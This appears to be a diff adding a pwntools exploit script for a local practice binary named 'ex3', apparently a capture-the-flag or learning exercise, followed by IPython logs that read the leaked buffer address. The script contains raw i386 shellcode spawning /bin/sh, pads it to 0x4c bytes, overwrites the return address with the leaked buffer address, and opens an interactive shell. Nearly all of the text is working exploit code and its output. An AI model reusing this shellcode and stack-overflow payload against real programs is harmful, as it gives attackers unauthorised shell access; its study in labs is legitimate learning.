@@ -1,0 +1,43 @@
+from pwn import*
+p=process('./ex3')
+
+
+
+#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
+
+
+
+context.log_level='debug'
+p.recvuntil(':')
+buf_addr = int(p.recvuntil('\n').strip(),16)
+shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+#shellcode = shellcraft.i386.linux.sh().bytes()
+payload = shellcode + (b'a'*(0x4c-len(shellcode))) + p32(buf_addr) #'\x58\x84\x04\x08'
+p.sendline(payload)
+p.interactive()
+
+
+In [1]: from pwn import*
+
+In [2]: p=process('./ex3')
+[x] Starting local process './ex3'
+[+] Starting local process './ex3': pid 2576
+
+In [3]: p.recvuntil(':')
+Out[3]: 'Your buf is at:'
+
+In [4]: p.recvuntil('\n').strip()
+Out[4]: '0xffc35ac0'
+
+
+In [1]: from pwn import*
+
+In [2]: p=process('./ex3')
+[x] Starting local process './ex3'
+[+] Starting local process './ex3': pid 2610
+
+In [3]: p.recvuntil('\n')[14:-2]
+Out[3]: ':0xff82622'
+
+
+
